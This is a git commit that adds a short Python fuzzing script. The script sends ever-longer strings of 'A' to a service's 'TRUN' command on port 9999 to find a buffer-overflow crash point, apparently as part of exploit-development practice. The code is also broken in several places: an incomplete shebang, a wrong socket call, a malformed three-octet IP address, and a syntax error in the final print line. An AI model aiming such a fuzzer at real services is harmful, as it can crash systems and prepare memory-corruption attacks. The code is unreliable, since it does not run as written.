6e4e8cd12711ebc96cccffd4d12cd86f2c28dc9a
Xavier Cho <cho.xavier@live.com>
2021-01-16 04:07:55 -0800

    Create fuzzing_buffer_overflow.py

---
+++ fuzzing_buffer_overflow.py
@@ -0,0 +1,18 @@
+#!/usr/bin/
+import sys, socket
+from time import sleep
+
+buffer = "A" *100
+
+while True:
+    try:
+        s=socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect(('192.168.90',9999))
+
+        s.send(('TRUN/.:'+buffer))
+        s.close()
+        sleep(1)
+        buffer=buffer+ "A"*100
+    except:
+        print "Fuzzing crashed %s bytes" %str((len)buffer)
+        sys.exit()
